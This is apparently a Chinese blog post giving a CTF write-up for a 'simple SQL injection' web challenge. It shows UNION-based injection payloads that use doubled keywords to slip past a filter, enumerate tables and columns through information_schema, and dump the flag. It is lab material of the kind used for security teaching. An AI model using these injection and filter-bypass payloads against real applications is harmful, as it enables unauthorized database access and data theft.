实验吧CTF-WEB

[ syxvip](https://www.jianshu.com/u/380fd93bae2c)关注赞赏支持

# 实验吧CTF-WEB

# 实验吧CTF题库-WEB

####
做题并没有按照顺序，跳着来做的，写文章的目的就是为了记录下解题的思路，当然如果能够顺便帮助到别人的话是最好不过的啦，哈哈~~~，有道友的话欢迎交流。

* * *

##### 1\. 简单的sql注入

通过注入获得flag值（提交格式：flag{}）  
解题链接：
[[http://ctf5.shiyanbar.com/423/web/]](http://ctf5.shiyanbar.com/423/web/%5D)

键入 1’  
提交后页面报错。You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax to use near
''1''' at line 1

所以页面应该是字符串注入，用order by 检测下有三列  
然后用联合查询，因为他过滤了过滤了关键词以及字段，所以用重复两个关键字来对付过滤机制。

    
    
    1' unionunion  selectselect  table_name  fromfrom  information_schema.tables wherewhere '1'='1
    

提交后爆出来的标段存在flage

    
    
    1' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name='flag
    
    
    1'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '1'='1
    

ID: 1' union select flag from flag where '1'='1  
name: baloteli  
ID: 1' union select flag from flag where '1'='1  
name: flag{Y0u_@r3_5O_dAmn_90Od}

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [实验吧ctf-web-writeup](https://www.jianshu.com/p/de313e43404d)

这是第一次做CTF题目，之前也是看别人的writeup,很多看不懂，但是今天先在ctf实验吧看了课程-web专题，...

[Meqiquan](https://www.jianshu.com/u/63fe6b5fc9e9)阅读 4,271评论 0赞 3

  * [数据库性能优化详解](https://www.jianshu.com/p/1ec9d6aea774)

转 # https://www.cnblogs.com/easypass/archive/2010/12/ 08/...

[吕品㗊](https://www.jianshu.com/u/6798aa90c0ed)阅读 9,267评论 0赞 44

  * [Java初级面试题](https://www.jianshu.com/p/08153f5678de)

1\. Java基础部分 基础部分的顺序：基本语法，类相关的语法，内部类的语法，继承相关的语法，异常的语法，线程的语...

[子非鱼_t_](https://www.jianshu.com/u/0ac615e458d5)阅读 30,871评论 18赞 399

  * [人是怎么审美de?](https://www.jianshu.com/p/9bb7030edd69)

审美是人类掌握世界的一种特殊形式，指人与世界（社会和自然）形成一种无功利的、形象的和情感的关系状态。 审美 审美观...

[后龙山大掌柜](https://www.jianshu.com/u/7c964b3130a9)阅读 611评论 0赞 3

  * [刮刀油画-花（两幅）](https://www.jianshu.com/p/5a0211da135d)

[一只萝卜呀](https://www.jianshu.com/u/17f35c15e32e)阅读 1,184评论 0赞 1

 